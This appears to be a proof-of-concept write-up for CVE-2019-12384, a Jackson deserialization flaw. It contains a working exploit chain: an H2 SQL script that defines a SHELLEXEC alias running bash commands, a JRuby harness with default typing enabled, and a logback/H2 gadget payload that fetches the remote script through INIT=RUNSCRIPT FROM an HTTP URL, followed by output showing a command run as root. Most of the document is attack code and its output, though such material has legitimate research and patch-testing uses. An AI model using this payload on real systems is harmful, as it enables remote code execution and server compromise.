# CVE-2019-12384 Jackson RCE  And SSRF
![](./CVE-2019-12384.jpg)

## 0x01 python -m SimpleHTTPServer
```
python -m SimpleHTTPServer
 
>>>Serving HTTP on 0.0.0.0 port 8000 ...
>>>127.0.0.1 - - [24/Jul/2019 03:06:32] "GET /inject.sql HTTP/1.1" 200 -
```
### inject.sql
```
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
        String[] command = {"bash", "-c", cmd};
        java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
        return s.hasNext() ? s.next() : "";  }
$$;
CALL SHELLEXEC('id > exploited.txt')
```

## 0x02 jruby Payload

### test.rb
```
require 'java'
Dir["./classpath/*.jar"].each do |f|
    require f
end
java_import 'com.fasterxml.jackson.databind.ObjectMapper'
java_import 'com.fasterxml.jackson.databind.SerializationFeature'

content = ARGV[0]

puts "Mapping"
mapper = ObjectMapper.new
mapper.enableDefaultTyping()
mapper.configure(SerializationFeature::FAIL_ON_EMPTY_BEANS, false);
puts "Serializing"
obj = mapper.readValue(content, java.lang.Object.java_class) # invokes all the setters
puts "objectified"
puts "stringified: " + mapper.writeValueAsString(obj)

```

```
jruby test.rb "[\"ch.qos.logback.core.db.DriverManagerConnectionSource\", {\"url\":\"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://localhost:8000/inject.sql'\"}]"


Mapping
Serializing
objectified
2019-07-24 03:06:33 lock: 3 exclusive write lock requesting for SYS
2019-07-24 03:06:33 lock: 3 exclusive write lock added for SYS
2019-07-24 03:06:33 lock: 3 exclusive write lock unlock SYS
2019-07-24 03:06:33 jdbc[3]:
/*SQL #:2 t:986*/RUNSCRIPT FROM 'http://localhost:8000/inject.sql';
2019-07-24 03:06:33 command: slow query: 987 ms
2019-07-24 03:06:33 jdbc[3]:
/**/Connection conn0 = DriverManager.getConnection("jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://localhost:8000/inject.sql'", "", "");
2019-07-24 03:06:33 jdbc[3]:
/**/conn0.getHoldability();
Unhandled Java exception: com.fasterxml.jackson.databind.JsonMappingException: Infinite recursion (StackOverflowError) (through reference chain: org.h2.schema.Schema["database"]->org.h2.engine.Database["mainSchema"]->org.h2.schema.Schema["database"]->org.h2.engine.Database["mainSchema"]->o
```


## 0x03 exploited.txt

```
cat exploited.txt

>>> uid=0(root) gid=0(root) groups=0(root)

```
## 参考链接：

https://blog.doyensec.com/2019/07/22/jackson-gadgets.html
